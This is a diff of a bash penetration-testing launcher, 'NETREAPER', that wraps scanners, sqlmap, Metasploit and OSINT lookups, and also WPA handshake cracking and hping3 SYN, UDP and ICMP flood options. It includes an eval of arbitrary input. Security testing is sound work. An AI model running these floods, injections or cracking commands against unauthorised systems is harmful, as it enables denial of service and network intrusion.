+    local wordlist="/usr/share/wordlists/dirb/common.txt"
+    echo -ne "    ${C_GHOST}Wordlist [$wordlist]: ${C_RESET}"
+    read -r custom_wordlist
+    wordlist="${custom_wordlist:-$wordlist}"
+    
+    log_attack "FFUF fuzzing on $TARGET"
+    echo
+    ffuf -u "${TARGET}/FUZZ" -w "$wordlist" -o "${OUTPUT_FILE}_ffuf.json" | tee -a "${LOG_DIR}/web.log"
+}
+
+run_nuclei() {
+    check_tool "nuclei" || return 1
+    log_attack "Nuclei scan on $TARGET"
+    echo
+    nuclei -u "$TARGET" -o "${OUTPUT_FILE}_nuclei.txt" | tee -a "${LOG_DIR}/web.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_nuclei.txt"
+}
+
+run_httpx() {
+    check_tool "httpx" || return 1
+    log_attack "httpx probing for $TARGET"
+    echo "$TARGET" | httpx -title -status-code -tech-detect -o "${OUTPUT_FILE}_httpx.txt" | tee -a "${LOG_DIR}/web.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_httpx.txt"
+}
+
+run_subfinder() {
+    check_tool "subfinder" || return 1
+    log_attack "Subfinder enumeration for $TARGET"
+    echo
+    subfinder -d "$TARGET" -o "${OUTPUT_FILE}_subfinder.txt" | tee -a "${LOG_DIR}/web.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_subfinder.txt"
+}
+
+run_amass() {
+    check_tool "amass" || return 1
+    log_attack "Amass mapping for $TARGET"
+    echo
+    amass enum -d "$TARGET" -o "${OUTPUT_FILE}_amass.txt" | tee -a "${LOG_DIR}/web.log"
+    log_loot "Results saved: ${OUTPUT_FILE}_amass.txt"
+}
+
+run_burpsuite() {
+    check_tool "burpsuite" || return 1
+    log_info "Launching Burp Suite"
+    burpsuite &
+}
+
+cmd_sqlmap() {
+    check_tool "sqlmap" || return 1
+    
+    echo -ne "    ${C_GHOST}Target URL with parameter (e.g., http://site.com/page?id=1): ${C_RESET}"
+    read -r url
+    
+    [[ -z "$url" ]] && { log_error "URL required"; return 1; }
+    
+    log_attack "SQL injection on $url"
+    echo
+    sqlmap -u "$url" --batch --risk=2 --level=3 | tee -a "${LOG_DIR}/web.log"
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# TOOL IMPLEMENTATIONS - EXPLOIT
+#═══════════════════════════════════════════════════════════════════════════════
+
+cmd_metasploit() {
+    check_tool "msfconsole" || return 1
+    log_attack "Launching Metasploit Framework"
+    echo
+    msfconsole
+}
+
+cmd_searchsploit() {
+    check_tool "searchsploit" || return 1
+    
+    echo -ne "    ${C_GHOST}Search term: ${C_RESET}"
+    read -r term
+    
+    [[ -z "$term" ]] && { log_error "Search term required"; return 1; }
+    
+    log_info "Searching exploits for: $term"
+    echo
+    searchsploit "$term"
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# TOOL IMPLEMENTATIONS - STRESS
+#═══════════════════════════════════════════════════════════════════════════════
+
+cmd_iperf3() {
+    check_tool "iperf3" || return 1
+    
+    echo
+    echo -e "    ${C_GHOST}[1]${C_RESET} Run as server"
+    echo -e "    ${C_GHOST}[2]${C_RESET} Run as client"
+    echo
+    echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+    read -r choice
+    
+    case "$choice" in
+        1)
+            log_info "Starting iperf3 server"
+            iperf3 -s
+            ;;
+        2)
+            echo -ne "    ${C_GHOST}Server IP: ${C_RESET}"
+            read -r server
+            echo -ne "    ${C_GHOST}Duration (seconds, default 10): ${C_RESET}"
+            read -r duration
+            duration="${duration:-10}"
+            
+            log_info "Bandwidth test to $server for ${duration}s"
+            iperf3 -c "$server" -t "$duration"
+            ;;
+    esac
+}
+
+cmd_hping3() {
+    check_tool "hping3" || return 1
+    require_root || return 1
+    get_target || return 1
+    
+    echo
+    echo -e "    ${C_GHOST}[1]${C_RESET} SYN flood"
+    echo -e "    ${C_GHOST}[2]${C_RESET} UDP flood"
+    echo -e "    ${C_GHOST}[3]${C_RESET} ICMP flood"
+    echo -e "    ${C_GHOST}[4]${C_RESET} Custom"
+    echo
+    echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+    read -r choice
+    
+    echo -ne "    ${C_GHOST}Port (default 80): ${C_RESET}"
+    read -r port
+    port="${port:-80}"
+    
+    echo -ne "    ${C_GHOST}Packet count (default 1000): ${C_RESET}"
+    read -r count
+    count="${count:-1000}"
+    
+    log_attack "hping3 attack on $TARGET:$port"
+    
+    case "$choice" in
+        1) hping3 -S --flood -p "$port" -c "$count" "$TARGET" ;;
+        2) hping3 --udp --flood -p "$port" -c "$count" "$TARGET" ;;
+        3) hping3 --icmp --flood -c "$count" "$TARGET" ;;
+        4)
+            echo -ne "    ${C_GHOST}Custom flags: ${C_RESET}"
+            read -r flags
+            IFS=' ' read -r -a flag_array <<< "$flags"
+            hping3 "${flag_array[@]}" "$TARGET"
+            ;;
+    esac
+}
+
+cmd_http_load() {
+    check_tool "ab" || { log_warning "ab not found. Install: sudo apt install apache2-utils"; return 1; }
+    get_target || return 1
+    
+    echo -ne "    ${C_GHOST}Concurrent connections (default 10): ${C_RESET}"
+    read -r conns
+    conns="${conns:-10}"
+    
+    echo -ne "    ${C_GHOST}Total requests (default 1000): ${C_RESET}"
+    read -r reqs
+    reqs="${reqs:-1000}"
+    
+    log_attack "HTTP load test on $TARGET ($reqs requests, $conns concurrent)"
+    echo
+    ab -n "$reqs" -c "$conns" "$TARGET/"
+}
+
+cmd_netem() {
+    require_root || return 1
+    get_interface || return 1
+    
+    echo
+    echo -e "    ${C_GHOST}[1]${C_RESET} Add latency"
+    echo -e "    ${C_GHOST}[2]${C_RESET} Add packet loss"
+    echo -e "    ${C_GHOST}[3]${C_RESET} Add bandwidth limit"
+    echo -e "    ${C_GHOST}[4]${C_RESET} Clear all impairments"
+    echo -e "    ${C_GHOST}[5]${C_RESET} Show current rules"
+    echo
+    echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+    read -r choice
+    
+    case "$choice" in
+        1)
+            echo -ne "    ${C_GHOST}Latency (ms): ${C_RESET}"
+            read -r latency
+            tc qdisc add dev "$IFACE" root netem delay "${latency}ms"
+            log_success "Added ${latency}ms latency to $IFACE"
+            ;;
+        2)
+            echo -ne "    ${C_GHOST}Packet loss (%): ${C_RESET}"
+            read -r loss
+            tc qdisc add dev "$IFACE" root netem loss "${loss}%"
+            log_success "Added ${loss}% packet loss to $IFACE"
+            ;;
+        3)
+            echo -ne "    ${C_GHOST}Rate limit (e.g., 1mbit): ${C_RESET}"
+            read -r rate
+            tc qdisc add dev "$IFACE" root tbf rate "$rate" burst 32kbit latency 400ms
+            log_success "Limited $IFACE to $rate"
+            ;;
+        4)
+            tc qdisc del dev "$IFACE" root 2>/dev/null
+            log_success "Cleared impairments on $IFACE"
+            ;;
+        5)
+            tc qdisc show dev "$IFACE"
+            ;;
+    esac
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# TOOL IMPLEMENTATIONS - OSINT
+#═══════════════════════════════════════════════════════════════════════════════
+
+run_theharvester() {
+    check_tool "theHarvester" || check_tool "theharvester" || return 1
+    log_info "theHarvester on $TARGET"
+    echo
+    theHarvester -d "$TARGET" -b all 2>/dev/null || theharvester -d "$TARGET" -b all
+}
+
+run_reconng() {
+    check_tool "recon-ng" || return 1
+    log_info "Launching Recon-ng"
+    recon-ng
+}
+
+run_shodan() {
+    if ! command -v shodan &>/dev/null; then
+        log_warning "Shodan CLI not found"
+        echo -e "    ${C_SHADOW}Install: pip3 install shodan && shodan init <API_KEY>${C_RESET}"
+        return 1
+    fi
+    log_info "Shodan search for $TARGET"
+    echo
+    shodan host "$TARGET"
+}
+
+run_whois() {
+    check_tool "whois" || return 1
+    log_info "WHOIS lookup for $TARGET"
+    echo
+    whois "$TARGET"
+}
+
+cmd_google_dork() {
+    echo -ne "    ${C_GHOST}Domain: ${C_RESET}"
+    read -r domain
+    
+    echo
+    echo -e "    ${C_SKULL}Common Google Dorks for ${C_VENOM}$domain${C_RESET}:"
+    echo
+    echo -e "    ${C_GHOST}site:$domain filetype:pdf${C_RESET}"
+    echo -e "    ${C_GHOST}site:$domain filetype:xls${C_RESET}"
+    echo -e "    ${C_GHOST}site:$domain inurl:admin${C_RESET}"
+    echo -e "    ${C_GHOST}site:$domain inurl:login${C_RESET}"
+    echo -e "    ${C_GHOST}site:$domain intitle:\"index of\"${C_RESET}"
+    echo -e "    ${C_GHOST}site:$domain ext:sql | ext:db | ext:log${C_RESET}"
+    echo -e "    ${C_GHOST}site:$domain intext:password${C_RESET}"
+    echo -e "    ${C_GHOST}\"$domain\" inurl:pastebin${C_RESET}"
+    echo
+    echo -e "    ${C_SHADOW}Copy and search in your browser${C_RESET}"
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# TOOL IMPLEMENTATIONS - UTILITIES
+#═══════════════════════════════════════════════════════════════════════════════
+
+cmd_traffic_capture() {
+    get_interface || return 1
+    
+    echo
+    echo -e "    ${C_GHOST}[1]${C_RESET} tcpdump (CLI)"
+    echo -e "    ${C_GHOST}[2]${C_RESET} Wireshark (GUI)"
+    echo -e "    ${C_GHOST}[3]${C_RESET} tshark (CLI + analysis)"
+    echo
+    echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+    read -r choice
+    
+    local outfile
+    outfile="${OUTPUT_DIR}/capture_$(date +%Y%m%d_%H%M%S).pcap"
+    
+    case "$choice" in
+        1)
+            check_tool "tcpdump" || return 1
+            require_root || return 1
+            log_info "Starting tcpdump on $IFACE (Ctrl+C to stop)"
+            echo -e "    ${C_SHADOW}Output: $outfile${C_RESET}"
+            tcpdump -i "$IFACE" -w "$outfile"
+            ;;
+        2)
+            check_tool "wireshark" || return 1
+            log_info "Launching Wireshark on $IFACE"
+            wireshark -i "$IFACE" -k &
+            ;;
+        3)
+            check_tool "tshark" || return 1
+            require_root || return 1
+            log_info "Starting tshark on $IFACE (Ctrl+C to stop)"
+            tshark -i "$IFACE" -w "$outfile"
+            ;;
+    esac
+}
+
+cmd_install_arsenal() {
+    require_root || return 1
+    
+    echo
+    echo -e "    ${C_SKULL}Install Categories:${C_RESET}"
+    echo
+    echo -e "    ${C_GHOST}[1]${C_RESET} Scanning tools        (nmap, masscan, etc.)"
+    echo -e "    ${C_GHOST}[2]${C_RESET} WiFi tools            (aircrack-ng, wifite, etc.)"
+    echo -e "    ${C_GHOST}[3]${C_RESET} Web tools             (nikto, sqlmap, etc.)"
+    echo -e "    ${C_GHOST}[4]${C_RESET} OSINT tools           (theharvester, recon-ng, etc.)"
+    echo -e "    ${C_GHOST}[5]${C_RESET} Traffic tools         (tcpdump, wireshark, etc.)"
+    echo -e "    ${C_GHOST}[6]${C_RESET} Stress tools          (hping3, iperf3, etc.)"
+    echo -e "    ${C_GHOST}[A]${C_RESET} ALL tools"
+    echo
+    echo -ne "    ${C_FIRE}▶ ${C_RESET}"
+    read -r choice
+    
+    case "$choice" in
+        1) apt install -y nmap masscan unicornscan netdiscover arp-scan fping hping3 p0f arping nbtscan amap ;;
+        2) apt install -y aircrack-ng wifite reaver bully pixiewps ;;
+        3) apt install -y nikto wpscan sqlmap dirb gobuster ffuf ;;
+        4) apt install -y theharvester recon-ng maltego whois ;;
+        5) apt install -y tcpdump wireshark tshark ettercap-graphical bettercap ;;
+        6) apt install -y hping3 iperf3 apache2-utils ;;
+        a|A)
+            log_info "Installing full arsenal (this may take a while)"
+            apt update
+            apt install -y \
+                nmap masscan unicornscan netdiscover arp-scan fping hping3 p0f arping nbtscan amap \
+                aircrack-ng wifite reaver bully pixiewps \
+                nikto wpscan sqlmap dirb gobuster ffuf \
+                theharvester recon-ng maltego whois \
+                tcpdump wireshark tshark ettercap-graphical bettercap \
+                hping3 iperf3 apache2-utils \
+                dnsenum dnsmap dnsrecon fierce \
+                sslscan sslyze \
+                onesixtyone snmpwalk smbmap smbclient enum4linux \
+                metasploit-framework exploitdb
+            log_success "Arsenal installed"
+            ;;
+    esac
+}
+
+cmd_tool_status() {
+    echo
+    echo -e "    ${C_SKULL}╔═══════════════════════════════════════════════════════════╗${C_RESET}"
+    echo -e "    ${C_SKULL}║${C_RESET}                    ${C_FIRE}ARSENAL STATUS${C_RESET}                        ${C_SKULL}║${C_RESET}"
+    echo -e "    ${C_SKULL}╚═══════════════════════════════════════════════════════════╝${C_RESET}"
+    echo
+    
+    local installed=0 missing=0
+    
+    # Check each category
+    for category in "SCANNING:${TOOLS_SCANNING[*]}" "DNS:${TOOLS_DNS[*]}" "SSL:${TOOLS_SSL[*]}" \
+                    "WIFI:${TOOLS_WIFI[*]}" "WEB:${TOOLS_WEB[*]}" "EXPLOIT:${TOOLS_EXPLOIT[*]}" \
+                    "TRAFFIC:${TOOLS_TRAFFIC[*]}" "OSINT:${TOOLS_OSINT[*]}" \
+                    "CREDS:${TOOLS_CREDS[*]}" "POST:${TOOLS_POST[*]}"; do
+        local name="${category%%:*}"
+        local tools="${category#*:}"
+        
+        echo -e "    ${C_GHOST}$name:${C_RESET}"
+        printf "    "
+        
+        for tool in $tools; do
+            if command -v "$tool" &>/dev/null; then
+                printf "${C_VENOM}✓${C_RESET}%-12s " "$tool"
+                ((installed++))
+            else
+                printf "${C_BLOOD}✗${C_RESET}%-12s " "$tool"
+                ((missing++))
+            fi
+        done
+        echo
+    done
+    
+    echo
+    echo -e "    ${C_VENOM}Installed: $installed${C_RESET}  ${C_BLOOD}Missing: $missing${C_RESET}"
+}
+
+cmd_view_logs() {
+    if [[ ! -d "$LOG_DIR" ]] || [[ -z "$(ls -A "$LOG_DIR" 2>/dev/null)" ]]; then
+        log_warning "No logs found"
+        return
+    fi
+    
+    echo
+    echo -e "    ${C_SKULL}Recent logs:${C_RESET}"
+    echo
+    # shellcheck disable=SC2012
+    ls -lt "$LOG_DIR"/*.log 2>/dev/null | head -10
+    echo
+    echo -ne "    ${C_GHOST}View file (or Enter to skip): ${C_RESET}"
+    read -r logfile
+    
+    [[ -n "$logfile" ]] && [[ -f "$logfile" ]] && less "$logfile"
+}
+
+cmd_generate_report() {
+    local report
+    report="${OUTPUT_DIR}/report_$(date +%Y%m%d_%H%M%S).md"
+    
+    {
+        echo "# NETREAPER Engagement Report"
+        echo "Generated: $(date)"
+        echo "Operator: $(whoami)@$(hostname)"
+        echo
+        echo "## Session Files"
+        echo
+        ls -la "$OUTPUT_DIR" 2>/dev/null
+        echo
+        echo "## Log Summary"
+        echo
+        wc -l "$LOG_DIR"/*.log 2>/dev/null
+        echo
+        echo "---"
+        echo "NETREAPER v${VERSION}"
+    } > "$report"
+    
+    log_loot "Report saved: $report"
+}
+
+cmd_run_direct() {
+    echo -ne "    ${C_GHOST}Command: ${C_RESET}"
+    read -r cmd
+    [[ -z "$cmd" ]] && return
+    log_info "Executing: $cmd"
+    echo
+    eval "$cmd"
+}
+
+show_help() {
+    clear
+    show_mini_banner
+    echo
+    echo -e "    ${C_SKULL}NETREAPER${C_RESET} - Network Security & WiFi Assault Toolkit"
+    echo
+    echo -e "    ${C_GHOST}USAGE:${C_RESET}"
+    echo "        $SCRIPT_NAME [--quiet|--json] [command] [options] [target]"
+    echo
+    echo -e "    ${C_GHOST}COMMANDS:${C_RESET}"
+    echo "        scan <target>       Port scanning (--full/--stealth/--vuln/--udp)"
+    echo "        wifi <mode> <if>    WiFi monitor/managed/scan"
+    echo "        crack <cap>         Handshake cracking (hashcat/aircrack/john/cowpatty)"
+    echo "        session <action>    start|resume|status|list|export|notes"
+    echo "        status              Show installed tools"
+    echo "        install             Install security tools"
+    echo "        menu                Interactive menu (default)"
+    echo "        help                Show this help"
+    echo "        version             Show version"
+    echo
+    echo -e "    ${C_GHOST}EXAMPLES:${C_RESET}"
+    echo "        $SCRIPT_NAME scan 192.168.1.0/24 --full"
+    echo "        $SCRIPT_NAME wifi --monitor wlan0"
+    echo "        $SCRIPT_NAME crack handshake.cap --hashcat-rules --wordlist custom.txt"
+    echo "        $SCRIPT_NAME session start"
+    echo
+    echo -e "    ${C_SHADOW}Config: $CONFIG_DIR${C_RESET}"
+    echo -e "    ${C_SHADOW}Logs:   $LOG_DIR${C_RESET}"
+    echo -e "    ${C_SHADOW}Output: $OUTPUT_DIR${C_RESET}"
+    echo
+    pause
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# CLI INTERFACE
+#═══════════════════════════════════════════════════════════════════════════════
+
+cli_scan() {
+    TARGET="$1"
+    shift
+    local scan_type="quick"
+    
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --full)    scan_type="full" ;;
+            --stealth) scan_type="stealth" ;;
+            --vuln)    scan_type="vuln" ;;
+            --udp)     scan_type="udp" ;;
+            *)         TARGET="$1" ;;
+        esac
+        shift
+    done
+    
+    [[ -z "$TARGET" ]] && { show_usage; exit 1; }
+    validate_target "$TARGET" || exit 1
+    OUTPUT_FILE="${OUTPUT_DIR}/${TARGET//[^a-zA-Z0-9._-]/_}_$(date +%Y%m%d_%H%M%S)"
+    
+    case "$scan_type" in
+        quick)   run_nmap_quick ;;
+        full)    run_nmap_full ;;
+        stealth) run_nmap_stealth ;;
+        vuln)    run_nmap_vuln ;;
+        udp)     run_nmap_udp ;;
+    esac
+}
+
+cli_wifi() {
+    local action="${1:-}" iface="${2:-}"
+    
+    case "$action" in
+        --monitor)
+            [[ -z "$iface" ]] && { log_error "Interface required"; exit 1; }
+            require_root || exit 1
+            IFACE="$iface"
+            ip link set "$IFACE" down
+            iw dev "$IFACE" set type monitor 2>/dev/null || iwconfig "$IFACE" mode monitor
+            ip link set "$IFACE" up
+            log_success "Monitor mode enabled on $IFACE"
+            ;;
+        --managed)
+            [[ -z "$iface" ]] && { log_error "Interface required"; exit 1; }
+            require_root || exit 1
+            IFACE="$iface"
+            ip link set "$IFACE" down
+            iw dev "$IFACE" set type managed 2>/dev/null || iwconfig "$IFACE" mode managed
+            ip link set "$IFACE" up
+            log_success "Managed mode enabled on $IFACE"
+            ;;
+        --scan)
+            require_root || exit 1
+            check_tool "airodump-ng" || exit 1
+            IFACE="${iface:-wlan0}"
+            airodump-ng "$IFACE"
+            ;;
+        *)
+            echo "Usage: $SCRIPT_NAME wifi [--monitor|--managed|--scan] <interface>"
+            ;;
+    esac
+}
+
+cli_crack() {
+    local mode="hashcat" capfile="" wordlist="/usr/share/wordlists/rockyou.txt" ssid="" rules=""
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --aircrack) mode="aircrack" ;;
+            --john) mode="john" ;;
+            --cowpatty) mode="cowpatty" ;;
+            --hashcat-rules) mode="hashcat-rules" ;;
+            -w|--wordlist) shift; wordlist="$1" ;;
+            --ssid) shift; ssid="$1" ;;
+            --rules) shift; rules="$1" ;;
+            *) capfile="$1" ;;
+        esac
+        shift
+    done
+    [[ -z "$capfile" ]] && { log_error "Capture/hash file required"; exit 1; }
+
+    case "$mode" in
+        aircrack)
+            check_tool "aircrack-ng" || exit 1
+            log_attack "Aircrack-ng dictionary attack (CLI)"
+            aircrack-ng -w "$wordlist" "$capfile" || exit 1
+            ;;
+        john)
+            check_tool "john" || exit 1
+            check_tool "hccap2john" || exit 1
+            local john_hash
+            john_hash="${LOOT_DIR}/john_cli_$(date +%Y%m%d_%H%M%S).hash"
+            hccap2john "$capfile" > "$john_hash"
+            john --wordlist="$wordlist" "$john_hash" || exit 1
+            john --show "$john_hash" || true
+            ;;
+        cowpatty)
+            check_tool "cowpatty" || exit 1
+            [[ -z "$ssid" ]] && { log_error "SSID required (--ssid)"; exit 1; }
+            log_attack "Cowpatty WPA crack (CLI)"
+            cowpatty -r "$capfile" -s "$ssid" -f "$wordlist" -2 || exit 1
+            ;;
+        hashcat-rules)
+            rules="${rules:-/usr/share/hashcat/rules/best64.rule}"
+            check_tool "hashcat" || exit 1
+            local hashfile_hr="$capfile"
+            if [[ "$capfile" =~ \.cap$|\.pcap$|\.pcapng$ ]]; then
+                hashfile_hr=$(cmd_convert_hashcat "$capfile" | tail -n 1)
+                [[ -z "$hashfile_hr" ]] && { log_error "Conversion failed"; exit 1; }
+            fi
+            hashcat -m 22000 -a 0 "$hashfile_hr" "$wordlist" -r "$rules" --status --status-timer=15 --potfile-path "${LOG_DIR}/hashcat.pot" --session netreaper || exit 1
+            ;;
+        *)
+            check_tool "hashcat" || exit 1
+            local hashfile="$capfile"
+            if [[ "$capfile" =~ \.cap$|\.pcap$|\.pcapng$ ]]; then
+                hashfile=$(cmd_convert_hashcat "$capfile" | tail -n 1)
+                [[ -z "$hashfile" ]] && { log_error "Conversion failed"; exit 1; }
+            fi
+            hashcat -m 22000 -a 0 "$hashfile" "$wordlist" --status --status-timer=15 --potfile-path "${LOG_DIR}/hashcat.pot" --session netreaper || exit 1
+            ;;
+    esac
+}
+
+cli_session() {
+    local action="${1:-status}"
+    case "$action" in
+        start) session_start ;;
+        resume) session_resume ;;
+        status) session_status ;;
+        list) session_list ;;
+        export) session_export ;;
+        notes) session_notes ;;
+        *) log_error "Unknown session action: $action"; exit 1 ;;
+    esac
+}
+
+show_usage() {
+    echo -e "${C_BLOOD}NETREAPER${C_RESET} v${VERSION} - Network Security & WiFi Assault Toolkit"
+    echo
+    echo "Usage: $SCRIPT_NAME [--quiet|--json] [command] [options] [target]"
+    echo
+    echo "Commands:"
+    echo "    scan <target>    Port scanning (--quick, --full, --stealth, --vuln, --udp)"
+    echo "    wifi             WiFi operations (--monitor, --managed, --scan)"
+    echo "    crack <cap>      Handshake cracking (hashcat/aircrack/john/cowpatty)"
+    echo "    session <act>    start|resume|status|list|export|notes"
+    echo "    status           Show installed tools"
+    echo "    install          Install tools (requires root)"
+    echo "    menu             Interactive menu"
+    echo "    help             Show this help"
+    echo
+    echo "Examples:"
+    echo "    $SCRIPT_NAME scan 192.168.1.0/24 --quick"
+    echo "    $SCRIPT_NAME wifi --monitor wlan0"
+    echo "    $SCRIPT_NAME crack handshake.cap --hashcat-rules"
+    echo "    $SCRIPT_NAME status"
+    echo "    $SCRIPT_NAME menu"
+}
+
+self_install() {
+    local install_path="/usr/local/bin/$SCRIPT_NAME"
+    
+    if [[ $EUID -ne 0 ]]; then
+        log_error "Installation requires root"
+        echo "    Run: sudo $0 --install"
+        exit 1
+    fi
+    
+    cp "$0" "$install_path"
+    chmod +x "$install_path"
+    log_success "Installed to $install_path"
+    echo -e "    Run '${C_VENOM}$SCRIPT_NAME${C_RESET}' from anywhere"
+}
+
+self_uninstall() {
+    local install_path="/usr/local/bin/$SCRIPT_NAME"
+    
+    if [[ $EUID -ne 0 ]]; then
+        log_error "Uninstallation requires root"
+        echo "    Run: sudo $0 --uninstall"
+        exit 1
+    fi
+    
+    rm -f "$install_path"
+    echo -ne "    ${C_GHOST}Remove config and logs? [y/N]: ${C_RESET}"
+    read -r confirm
+    [[ "${confirm,,}" == "y" ]] && rm -rf "$CONFIG_DIR"
+    log_success "Uninstalled"
+}
+
+#═══════════════════════════════════════════════════════════════════════════════
+# MAIN
+#═══════════════════════════════════════════════════════════════════════════════
+
+main() {
+    # Handle install/uninstall first
+    case "${1:-}" in
+        --install)   self_install; exit 0 ;;
+        --uninstall) self_uninstall; exit 0 ;;
+    esac
+
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            -q|--quiet) QUIET=1; shift ;;
+            --json) JSON_OUTPUT=1; QUIET=1; NO_COLOR=1; shift ;;
+            --no-color) NO_COLOR=1; shift ;;
+            *) break ;;
+        esac
+    done
+
+    # Initialize directories
+    mkdir -p "$LOG_DIR" "$OUTPUT_DIR" "$LOOT_DIR"
+    
+    # Legal disclaimer check
+    check_legal
+    
+    # Parse arguments
+    case "${1:-}" in
+        ""|menu|-i)  main_menu ;;
+        scan)        shift; cli_scan "$@" ;;
+        wifi)        shift; cli_wifi "$@" ;;
+        crack)       shift; cli_crack "$@" ;;
+        session)     shift; cli_session "$@" ;;
+        status)      cmd_tool_status ;;
+        install)     cmd_install_arsenal ;;
+        help|-h|--help) show_usage ;;
+        version|-v|--version) echo "$SCRIPT_NAME v$VERSION ($CODENAME)" ;;
+        *)           log_error "Unknown command: $1"; show_usage; exit 1 ;;
+    esac
+}
+
+main "$@"
